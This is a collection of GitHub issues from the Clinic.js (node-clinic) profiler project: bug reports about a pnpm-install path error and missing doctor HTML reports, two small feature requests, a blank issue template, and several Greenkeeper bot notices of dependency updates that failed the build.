`ctrl+c` returns error if `clinic was installed with pnpm:

```
[==  ] Analysing dataevents.js:183
      throw er; // Unhandled 'error' event
      ^

Error: ENOTDIR: not a directory, stat '/Users/jsumners/n/pnpm-global/1/node_modules/.registry.npmjs.org/clinic/3.0.0/node_modules/clinic/bin.js/node_modules/d3-dispatch'
```

## Steps to Reproduce (for bugs)
1. `npm i -g pnpm`
2. `pnpm i -g clinic`
3. `clinic flame -- node script.js`
4. `ctrl+c` to finish test and attempt to generate graph

## Environment
<!--- Check with `clinic -v` and `clinic doctor -v` -->
<!--- e.g. Clinic v0.8.1 Doctor v2.4.1 -->
* Clinic version: v3.0.0

<!--- Check with `node -v` and `npm -v` -->
<!--- e.g. Node v10.2.1 npm v6.0.1 -->
* Node version: v8.15.0

<!--- See https://whatbrowser.org/ -->
<!--- e.g. Chrome 67 -->
* Browser name and version: 

<!--- See http://whatsmyos.com/ -->
<!--- e.g. OSX 10.11.5 -->
* Operating system and version: macOS 10.14.3
 ## Expected Behavior
```
clinic flame -- node script.js # run test and ctrl+c should generate a flame graph
```

## Current Behavior
`ctrl+c` returns error if `clinic` was installed with pnpm:

```
[==  ] Analysing dataevents.js:183
      throw er; // Unhandled 'error' event
      ^

Error: ENOTDIR: not a directory, stat '/Users/jsumners/n/pnpm-global/1/node_modules/.registry.npmjs.org/clinic/3.0.0/node_modules/clinic/bin.js/node_modules/d3-dispatch'
```

## Steps to Reproduce (for bugs)
1. `npm i -g pnpm`
2. `pnpm i -g clinic`
3. `clinic flame -- node script.js`
4. `ctrl+c` to finish test and attempt to generate graph

## Environment
<!--- Check with `clinic -v` and `clinic doctor -v` -->
<!--- e.g. Clinic v0.8.1 Doctor v2.4.1 -->
* Clinic version: v3.0.0

<!--- Check with `node -v` and `npm -v` -->
<!--- e.g. Node v10.2.1 npm v6.0.1 -->
* Node version: v8.15.0

<!--- See https://whatbrowser.org/ -->
<!--- e.g. Chrome 67 -->
* Browser name and version: 

<!--- See http://whatsmyos.com/ -->
<!--- e.g. OSX 10.11.5 -->
* Operating system and version: macOS 10.14.3
 If I ssh into a machine and I try `clinic login`, the browser could not be open. It would be great to print the login URL to the terminal as well. 
## The dependency [ora](https://github.com/sindresorhus/ora) was updated from `3.1.0` to `3.2.0`.

🚨 [View failing branch](https://github.com/nearform/node-clinic/compare/master...nearform:greenkeeper%2Fora-3.2.0).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.




ora is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **nearform.node-clinic:** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=767) 
- ✅ **nearform.node-clinic (Mac node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=767) 
- ✅ **nearform.node-clinic (Mac node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=767) 
- ❌ **nearform.node-clinic (Mac node_11_x):** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=767) 
- ✅ **nearform.node-clinic (Windows node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=767) 
- ✅ **nearform.node-clinic (Linux node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=767) 
- ✅ **nearform.node-clinic (Windows node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=767) 
- ✅ **nearform.node-clinic (Linux node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=767) 
- ✅ **nearform.node-clinic (Linux node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=767) 
- ✅ **nearform.node-clinic (Windows node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=767) 
</details>


---

<details>
<summary>Release Notes for v3.2.0</summary>

<ul>
<li>Add TypeScript definition (<a class="issue-link js-issue-link" data-error-text="Failed to load issue title" data-id="414857684" data-permission-text="Issue title is private" data-url="https://github.com/sindresorhus/ora/issues/101" data-hovercard-type="pull_request" data-hovercard-url="/sindresorhus/ora/pull/101/hovercard" href="https://urls.greenkeeper.io/sindresorhus/ora/pull/101">#101</a>)  <a class="commit-link" data-hovercard-type="commit" data-hovercard-url="https://github.com/sindresorhus/ora/commit/2768e75126bbe328e9efe8d2f6d32e6585eb2e8b/hovercard" href="https://urls.greenkeeper.io/sindresorhus/ora/commit/2768e75126bbe328e9efe8d2f6d32e6585eb2e8b"><tt>2768e75</tt></a></li>
</ul>
<p><a class="commit-link" href="https://urls.greenkeeper.io/sindresorhus/ora/compare/v3.1.0...v3.2.0"><tt>v3.1.0...v3.2.0</tt></a></p>
</details>

<details>
<summary>Commits</summary>
<p>The new version differs by 3 commits.</p>
<ul>
<li><a href="https://urls.greenkeeper.io/sindresorhus/ora/commit/f33e6dcfc3172d2fb537d6543e30171f4d056a5a"><code>f33e6dc</code></a> <code>3.2.0</code></li>
<li><a href="https://urls.greenkeeper.io/sindresorhus/ora/commit/407b8a5708832796929bf206546557f853f7bd3a"><code>407b8a5</code></a> <code>Meta tweaks</code></li>
<li><a href="https://urls.greenkeeper.io/sindresorhus/ora/commit/2768e75126bbe328e9efe8d2f6d32e6585eb2e8b"><code>2768e75</code></a> <code>Add TypeScript definition (#101)</code></li>
</ul>
<p>See the <a href="https://urls.greenkeeper.io/sindresorhus/ora/compare/3f5ae20d8036dfa545608910aa59c66325145260...f33e6dcfc3172d2fb537d6543e30171f4d056a5a">full diff</a></p>
</details>


<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 
## The dependency [split2](https://github.com/mcollina/split2) was updated from `3.1.0` to `3.1.1`.

🚨 [View failing branch](https://github.com/nearform/node-clinic/compare/master...nearform:greenkeeper%2Fsplit2-3.1.1).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.




split2 is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **nearform.node-clinic:** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=941) 
- ✅ **nearform.node-clinic (Windows node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=941) 
- ✅ **nearform.node-clinic (Windows node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=941) 
- ✅ **nearform.node-clinic (Windows node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=941) 
- ✅ **nearform.node-clinic (Linux node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=941) 
- ❌ **nearform.node-clinic (Mac node_8_x):** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=941) 
- ✅ **nearform.node-clinic (Linux node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=941) 
- ✅ **nearform.node-clinic (Mac node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=941) 
- ✅ **nearform.node-clinic (Linux node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=941) 
- ✅ **nearform.node-clinic (Mac node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=941) 
</details>


---

<details>
<summary>Release Notes for v3.1.1</summary>

<h2>What’s Changed</h2>
<ul>
<li>test: add a test case for char-grouped streams (<a class="issue-link js-issue-link" data-error-text="Failed to load issue title" data-id="413705725" data-permission-text="Issue title is private" data-url="https://github.com/mcollina/split2/issues/25" data-hovercard-type="pull_request" data-hovercard-url="/mcollina/split2/pull/25/hovercard" href="https://urls.greenkeeper.io/mcollina/split2/pull/25">#25</a>) <a class="user-mention" data-hovercard-type="user" data-hovercard-url="/hovercards?user_id=15669918" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://urls.greenkeeper.io/matfax">@matfax</a></li>
<li>Don't modify the options object (<a class="issue-link js-issue-link" data-error-text="Failed to load issue title" data-id="421831764" data-permission-text="Issue title is private" data-url="https://github.com/mcollina/split2/issues/27" data-hovercard-type="pull_request" data-hovercard-url="/mcollina/split2/pull/27/hovercard" href="https://urls.greenkeeper.io/mcollina/split2/pull/27">#27</a>) <a class="user-mention" data-hovercard-type="user" data-hovercard-url="/hovercards?user_id=38304172" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://urls.greenkeeper.io/wraugh">@wraugh</a></li>
</ul>
</details>

<details>
<summary>Commits</summary>
<p>The new version differs by 6 commits.</p>
<ul>
<li><a href="https://urls.greenkeeper.io/mcollina/split2/commit/a7ebf268a646be4c8507d909b822f4fd1e34a2be"><code>a7ebf26</code></a> <code>Bumped v3.1.1</code></li>
<li><a href="https://urls.greenkeeper.io/mcollina/split2/commit/e5c6d3b344d4a5c0d02cd0f4b89f5826c8431191"><code>e5c6d3b</code></a> <code>Merge pull request #27 from wraugh/master</code></li>
<li><a href="https://urls.greenkeeper.io/mcollina/split2/commit/dd271a3e5b3593fe6604fbccafb1bef7941fe0b6"><code>dd271a3</code></a> <code>Added release drafter</code></li>
<li><a href="https://urls.greenkeeper.io/mcollina/split2/commit/809d6fcf9cac4ea53f24d9bc7127e205a39d6619"><code>809d6fc</code></a> <code>Don't modify the options object</code></li>
<li><a href="https://urls.greenkeeper.io/mcollina/split2/commit/cf151d48febb8877a12888f546b108dc11d63f47"><code>cf151d4</code></a> <code>Merge pull request #25 from matfax/patch-1</code></li>
<li><a href="https://urls.greenkeeper.io/mcollina/split2/commit/a372397b90332001b92812b1dcf73d95cb72df12"><code>a372397</code></a> <code>test: add a test case for char-grouped streams</code></li>
</ul>
<p>See the <a href="https://urls.greenkeeper.io/mcollina/split2/compare/a9b7da45e6dacdd5e33b52907cadaefb73fd4aa8...a7ebf268a646be4c8507d909b822f4fd1e34a2be">full diff</a></p>
</details>


<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 
## The dependency [@nearform/bubbleprof](https://github.com/nearform/node-clinic-bubbleprof) was updated from `2.0.1` to `2.1.0`.

🚨 [View failing branch](https://github.com/nearform/node-clinic/compare/master...nearform:greenkeeper%2F%40nearform%2Fbubbleprof-2.1.0).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.




@nearform/bubbleprof is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **nearform.node-clinic:** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=956) 
- ✅ **nearform.node-clinic (Windows node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=956) 
- ✅ **nearform.node-clinic (Windows node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=956) 
- ✅ **nearform.node-clinic (Windows node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=956) 
- ✅ **nearform.node-clinic (Linux node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=956) 
- ✅ **nearform.node-clinic (Linux node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=956) 
- ❌ **nearform.node-clinic (Mac node_8_x):** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=956) 
- ✅ **nearform.node-clinic (Linux node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=956) 
- ✅ **nearform.node-clinic (Mac node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=956) 
- ✅ **nearform.node-clinic (Mac node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=956) 
</details>


---

<details>
<summary>Commits</summary>
<p>The new version differs by 4 commits.</p>
<ul>
<li><a href="https://urls.greenkeeper.io/nearform/node-clinic-bubbleprof/commit/947164fa69e0007d7514488d0be275ada477a42f"><code>947164f</code></a> <code>2.1.0</code></li>
<li><a href="https://urls.greenkeeper.io/nearform/node-clinic-bubbleprof/commit/e473a2eb31522e51de7062ad5720815e8d609872"><code>e473a2e</code></a> <code>[653] - Fix Clinic.js naming across files (#315)</code></li>
<li><a href="https://urls.greenkeeper.io/nearform/node-clinic-bubbleprof/commit/0a5a60e23a4e0db164b6a8657f3e190ced0f6e8e"><code>0a5a60e</code></a> <code>More specific userland names for node clusters (#313)</code></li>
<li><a href="https://urls.greenkeeper.io/nearform/node-clinic-bubbleprof/commit/cc0adcb9b323f9bdb10b65465b9a328d772984f0"><code>cc0adcb</code></a> <code>Render area chart as canvas instead of SVG (#312)</code></li>
</ul>
<p>See the <a href="https://urls.greenkeeper.io/nearform/node-clinic-bubbleprof/compare/37c8f2f57f83d0fefc504ff4a335146451d08fb2...947164fa69e0007d7514488d0be275ada477a42f">full diff</a></p>
</details>


<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 ## Expected Behavior
An html report generated

## Current Behavior
No html files created, clinic creates folder `1888.clinic-doctor` containing file `1888.clinic-doctor-processstat` and `1888.clinic-doctor-systeminfo` and that's all.

## Steps to Reproduce (for bugs)
1. clinic doctor -- node build/src/server.js
2. wait for server to initialize
3. press ctrl-c

## Sample upload
https://upload.clinicjs.org/public/97f8d6ff2dadfe11ab3288e48383826a800fc51a31a7339690a768d51111c960/1888.clinic-doctor.html
But as no html actually generated this url doesn't works anyway.

## Environment
* Clinic version: 3.0.0
* Node version: 8.9.4
* Operating system and version: Windows 10.0.17134.619

Is there some verbose mode or logs to understand what goes wrong?

Also tried to install clinic locally (without -g parameter) - it creates incomplete html without body with header section only. But there is no error messages.

It looks like clinic is interrupted by ctrl-c instead of (before) server. 
## The devDependency [tap](https://github.com/tapjs/node-tap) was updated from `12.5.2` to `12.5.3`.

🚨 [View failing branch](https://github.com/nearform/node-clinic/compare/master...nearform:greenkeeper%2Ftap-12.5.3).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.




tap is a devDependency of this project. It **might not break your production code or affect downstream projects**, but probably breaks your build or test tools, which may **prevent deploying or publishing**.



<details>
<summary>Status Details</summary>

- ❌ **nearform.node-clinic:** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=698) 
- ✅ **nearform.node-clinic (Mac node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=698) 
- ❌ **nearform.node-clinic (Mac node_10_x):** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=698) 
- ✅ **nearform.node-clinic (Mac node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=698) 
- ✅ **nearform.node-clinic (Windows node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=698) 
- ✅ **nearform.node-clinic (Linux node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=698) 
- ✅ **nearform.node-clinic (Linux node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=698) 
- ✅ **nearform.node-clinic (Windows node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=698) 
- ✅ **nearform.node-clinic (Linux node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=698) 
- ✅ **nearform.node-clinic (Windows node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=698) 
</details>


---

<details>
<summary>Commits</summary>
<p>The new version differs by 2 commits.</p>
<ul>
<li><a href="https://urls.greenkeeper.io/tapjs/node-tap/commit/223337652f146c546a27ee404ed68c24289b527c"><code>2233376</code></a> <code>12.5.3</code></li>
<li><a href="https://urls.greenkeeper.io/tapjs/node-tap/commit/b45105f3a987eab5120410de1c60a6e4b848ae4c"><code>b45105f</code></a> <code>nyc@13.3.0</code></li>
</ul>
<p>See the <a href="https://urls.greenkeeper.io/tapjs/node-tap/compare/611ced813b2f68040d5363ec67caa245a27f1145...223337652f146c546a27ee404ed68c24289b527c">full diff</a></p>
</details>


<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 
## The devDependency [proxyquire](https://github.com/thlorenz/proxyquire) was updated from `2.1.0` to `2.1.1`.

🚨 [View failing branch](https://github.com/nearform/node-clinic/compare/master...nearform:greenkeeper%2Fproxyquire-2.1.1).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.




proxyquire is a devDependency of this project. It **might not break your production code or affect downstream projects**, but probably breaks your build or test tools, which may **prevent deploying or publishing**.



<details>
<summary>Status Details</summary>

- ❌ **nearform.node-clinic:** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1484) 
- ✅ **nearform.node-clinic (Windows node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1484) 
- ✅ **nearform.node-clinic (Windows node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1484) 
- ✅ **nearform.node-clinic (Windows node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1484) 
- ✅ **nearform.node-clinic (Windows node_12_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1484) 
- ✅ **nearform.node-clinic (Linux node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1484) 
- ✅ **nearform.node-clinic (Mac node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1484) 
- ✅ **nearform.node-clinic (Linux node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1484) 
- ✅ **nearform.node-clinic (Mac node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1484) 
- ✅ **nearform.node-clinic (Linux node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1484) 
- ✅ **nearform.node-clinic (Mac node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1484) 
- ✅ **nearform.node-clinic (Linux node_12_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1484) 
- ❌ **nearform.node-clinic (Mac node_12_x):** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1484) 
</details>


---

<details>
<summary>Commits</summary>
<p>The new version differs by 6 commits.</p>
<ul>
<li><a href="https://urls.greenkeeper.io/thlorenz/proxyquire/commit/5b88b0798f57767af63c89292faa0357181db8ea"><code>5b88b07</code></a> <code>2.1.1</code></li>
<li><a href="https://urls.greenkeeper.io/thlorenz/proxyquire/commit/3905975874c41480e995a017dab091fa2d545290"><code>3905975</code></a> <code>Update dependencies (#243)</code></li>
<li><a href="https://urls.greenkeeper.io/thlorenz/proxyquire/commit/3ca62af56e4683f31791b64baab2000ad21e2491"><code>3ca62af</code></a> <code>funding: adding github funding spec</code></li>
<li><a href="https://urls.greenkeeper.io/thlorenz/proxyquire/commit/12606d1bad1cec34653061f66fa7c8516f6480ce"><code>12606d1</code></a> <code>README.md: Fix typo (#241)</code></li>
<li><a href="https://urls.greenkeeper.io/thlorenz/proxyquire/commit/3da0603d1bcb88a1086e8fc721151eefb96c7d17"><code>3da0603</code></a> <code>Add file path reference to readme (#237)</code></li>
<li><a href="https://urls.greenkeeper.io/thlorenz/proxyquire/commit/cb725be3826eef02a0f9d6febca69db30bed0783"><code>cb725be</code></a> <code>readme: fix simple-get example</code></li>
</ul>
<p>See the <a href="https://urls.greenkeeper.io/thlorenz/proxyquire/compare/886436106d7d14a2a0f918fbf3386ce31a9ff092...5b88b0798f57767af63c89292faa0357181db8ea">full diff</a></p>
</details>


<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 If we run `clinic doctor -- foo bar`, we should provide the user a proper error that guide them into using a Node.js executable.  ## Expected Behavior
<!--- If you're describing a bug, tell us what should happen -->
<!--- If you're suggesting a change/improvement, tell us how it should work -->

## Current Behavior
<!--- If describing a bug, tell us what happens instead of the expected behavior -->
<!--- If suggesting a change/improvement, explain the difference from current behavior -->

## Steps to Reproduce (for bugs)
<!--- Provide an unambiguous set of steps to reproduce this bug -->
1.
2.
3.
4.

## Sample upload
<!--- Please `clinic upload` your generated sample and paste the link here -->

## Environment
<!--- Check with `clinic -v` and `clinic doctor -v` -->
<!--- e.g. Clinic.js v0.8.1 Doctor v2.4.1 -->
* Clinic.js version:

<!--- Check with `node -v` and `npm -v` -->
<!--- e.g. Node v10.2.1 npm v6.0.1 -->
* Node.js version:

<!--- See https://whatbrowser.org/ -->
<!--- e.g. Chrome 67 -->
* Browser name and version:

<!--- See http://whatsmyos.com/ -->
<!--- e.g. OSX 10.11.5 -->
* Operating system and version:
 
## The dependency [inquirer]() was updated from `6.4.1` to `6.5.0`.

🚨 [View failing branch](https://github.com/nearform/node-clinic/compare/master...nearform:greenkeeper%2Finquirer-6.5.0).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.




inquirer is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **nearform.node-clinic:** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Mac node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ❌ **nearform.node-clinic (Mac node_10_x):** [1 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Mac node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Mac node_12_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Linux node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Windows node_8_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Linux node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Windows node_10_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Linux node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Windows node_11_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Windows node_12_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
- ✅ **nearform.node-clinic (Linux node_12_x):** [0 errors / 0 warnings](https://dev.azure.com/node-clinic/2b9deede-6b72-4dba-ad37-1513920213fb/_build/results?buildId=1462) 
</details>


---

<details>
<summary>Commits</summary>
<p>The new version differs by 7 commits.</p>
<ul>
<li><a href="https://urls.greenkeeper.io/SBoudrias/Inquirer.js/commit/da5d0e22de84486240b12f52643fbd573f8d0d38"><code>da5d0e2</code></a> <code>Publish</code></li>
<li><a href="https://urls.greenkeeper.io/SBoudrias/Inquirer.js/commit/e05ae81019a6b524917b2453c107aa93d661b705"><code>e05ae81</code></a> <code>Issue 711 update (#825)</code></li>
<li><a href="https://urls.greenkeeper.io/SBoudrias/Inquirer.js/commit/dbfe8904190f33cae41fecc4cb775d4dfcc5615e"><code>dbfe890</code></a> <code>Clear password field on backspace (#821)</code></li>
<li><a href="https://urls.greenkeeper.io/SBoudrias/Inquirer.js/commit/e14796b41980264dd17f03c50063db542dcd3f2b"><code>e14796b</code></a> <code>Upgrade lodash to 4.17.12 to Fix Vulnerability (#824)</code></li>
<li><a href="https://urls.greenkeeper.io/SBoudrias/Inquirer.js/commit/29ac9657f747e83198639b3052d0d513831b37e8"><code>29ac965</code></a> <code>Update husky to the latest version 🚀 (#819)</code></li>
<li><a href="https://urls.greenkeeper.io/SBoudrias/Inquirer.js/commit/d82131ef824fc7c6052ed0333fc932dce2d0932c"><code>d82131e</code></a> <code>Update lint-staged to the latest version 🚀 (#818)</code></li>
<li><a href="https://urls.greenkeeper.io/SBoudrias/Inquirer.js/commit/1f849abcf88690931e23ada062e0d19e9b83545b"><code>1f849ab</code></a> <code>feat: add inquirer-file-tree-selection-prompt readme (#815)</code></li>
</ul>
<p>See the <a href="https://urls.greenkeeper.io/SBoudrias/Inquirer.js/compare/b951b48e46930b3fe6300b7f42f58d3042579619...da5d0e22de84486240b12f52643fbd573f8d0d38">full diff</a></p>
</details>


<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 ## Expected Behavior
An html report generated

## Current Behavior
No html files created, clinic creates folder `1888.clinic-doctor` containing file `1888.clinic-doctor-processstat` and `1888.clinic-doctor-systeminfo` and that's all.

## Steps to Reproduce (for bugs)
1. clinic doctor -- node build/src/server.js
